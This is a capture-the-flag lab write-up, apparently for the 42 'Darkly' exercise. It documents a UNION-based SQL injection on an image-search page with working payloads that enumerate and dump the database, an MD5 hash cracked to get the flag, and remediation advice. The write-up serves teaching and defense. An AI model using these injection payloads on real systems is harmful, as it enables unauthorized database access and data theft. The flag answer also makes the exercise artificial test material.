# SQL Injection - Image Search

## Breach Type
**SQL Injection (SQLi)** — OWASP Top 10: A03:2021 Injection

## What is this Vulnerability?
**SQL Injection** is a code injection technique that exploits a security vulnerability in an application's database layer. It occurs when user input is inserted into SQL queries **without proper sanitization or parameterization**.

In simple terms: the application takes what you type and inserts it directly into a database query. Instead of typing a normal value like `1`, an attacker types **SQL code** like `1 UNION SELECT password FROM users`, and the database executes it as part of the query.

### Why is it dangerous?
- **Data theft**: An attacker can read the entire database — usernames, passwords, emails, credit cards
- **Authentication bypass**: Login forms can be bypassed with `' OR 1=1 --`
- **Data manipulation**: Attackers can INSERT, UPDATE, or DELETE data
- **Remote code execution**: In some cases, attackers can execute system commands via `xp_cmdshell` (MSSQL) or `LOAD_FILE()` (MySQL)
- **Full server compromise**: From database access, attackers can often pivot to the underlying server

### Real-world impact
SQL Injection has been responsible for some of the largest data breaches in history (Sony, LinkedIn, Yahoo). It consistently ranks as one of the most critical web vulnerabilities in the OWASP Top 10.

## Where
URL: `http://<IP>/?page=searchimg`
The "Search image by ID" form on the Images/Search Images page.

## How I Found It
1. Navigated to the **Search Images** page (`?page=searchimg`).
2. The page has a search form that takes an `id` parameter to look up images.
3. Entered `1 OR 1=1` — this returned **all images** instead of just one, confirming SQL injection.
4. The underlying query is something like: `SELECT * FROM images WHERE id = <user_input>`
5. Since there's no sanitization, I can inject arbitrary SQL after the id value.

## Step-by-Step Exploitation

### Step 1: Confirm SQL Injection
```
Input: 1 OR 1=1
```
Result: All images returned instead of just one — confirms the input is injected into the SQL query.

### Step 2: Find Number of Columns (UNION SELECT)
```
Input: 1 UNION SELECT 1,2
```
Result: Shows "Title: 1" and "Url: 2" — confirms **2 columns** in the output.

### Step 3: Enumerate Database Tables
```
Input: 1 UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()
```
Result: Found table `list_images` with columns: `id`, `url`, `title`, `comment`.

### Step 4: Dump Image Data
```
Input: 1 UNION SELECT CONCAT(id,0x7c,title),CONCAT(comment,0x7c,url) FROM list_images
```
Result: Found image ID 5:
- Title: `Hack me ?`
- Comment: `If you read this just use this: 1928e8083cf461a51303633093573c46`
- URL: `borntosec.42.fr/images/dog.jpg`

### Step 5: Crack the MD5 Hash
The hash `1928e8083cf461a51303633093573c46` is MD5:
```
1928e8083cf461a51303633093573c46 → albatroz
```
You can use https://crackstation.net.

### Step 6: Apply Transformation to Get the Flag
Following the same pattern as the Member SQL injection:
1. Lowercase: `albatroz` → `albatroz` (already lowercase)
2. SHA-256:
```bash
echo -n "albatroz" | sha256sum
```
Result: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

## Flag
```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## How to Test Manually
1. Open your browser and go to `http://<IP>/?page=searchimg`
2. In the search box, type: `1 OR 1=1` → Click Submit → See all images returned
3. Type: `1 UNION SELECT 1,2` → Confirms 2 columns
4. Type: `1 UNION SELECT CONCAT(id,0x7c,title),CONCAT(comment,0x7c,url) FROM list_images` → See all image data
5. Find the comment with the MD5 hash from image ID 5
6. Crack `1928e8083cf461a51303633093573c46` on https://crackstation.net → `albatroz`
7. SHA-256 it: `echo -n "albatroz" | sha256sum`

## How to Fix
- **Use prepared statements** (parameterized queries) — this is the #1 defense:
  ```php
  $stmt = $pdo->prepare("SELECT * FROM list_images WHERE id = ?");
  $stmt->execute([$id]);
  ```
- **Use an ORM** (Object-Relational Mapping) like Doctrine, Eloquent, or SQLAlchemy
- **Validate input types** — if `id` should be an integer, cast it: `$id = (int)$_GET['id']`
- **Apply least privilege** — the database user should only have SELECT access, not UNION/information_schema
- **Use a Web Application Firewall (WAF)** to detect and block SQLi patterns
- **Don't expose raw database errors** to users — they reveal database structure

## OWASP Reference
- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
